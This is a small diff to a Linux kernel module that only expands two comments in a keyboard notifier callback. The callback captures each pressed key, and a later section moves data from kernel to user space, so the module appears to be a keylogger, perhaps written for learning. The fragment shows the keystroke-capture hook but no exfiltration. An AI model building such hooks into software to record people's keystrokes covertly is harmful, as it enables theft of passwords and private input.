@@ -104,7 +104,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 
 	struct keyboard_notifier_param *param = data;
 
-	// We are only interesrted in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
+	// We are only interesrted in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key. down return 1 if the key is pressed.
 	if (action == KBD_KEYSYM && param->down){
 		char c = param->value;
 		
@@ -137,7 +137,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 		}
 	
 	}
-	return NOTIFY_OK; // This retrun value means that the notification was processed correctly.
+	return NOTIFY_OK; // This retrun value means that the notification was processed correctly. The notifier expects a return value from each callback function.
 }
 
 /*============================= Kerenl space to user space ===========================*/
